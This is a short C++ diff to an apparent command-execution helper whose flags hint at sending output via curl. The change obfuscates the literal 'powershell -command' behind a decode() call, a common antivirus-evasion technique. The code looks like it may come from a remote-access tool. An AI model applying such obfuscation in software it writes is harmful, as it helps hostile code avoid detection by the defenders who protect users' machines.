@@ -125,7 +125,7 @@ BOOL Tools::isSystem32Bit()
 std::string Tools::CMD(std::string command, BOOL modify_for_curl_send, BOOL powershell, BOOL changeDirectory, BOOL fileExplorer)
 {
 	if (powershell)
-		command =  "powershell -command \" & " + std::string(command) + "\"";
+		command =  this->decode("llherswepondmaom-c ") + " \" & " + std::string(command) + "\""; // decode string -> powershell -command
 
 	std::array<char, 128> buffer;
 	std::string result;
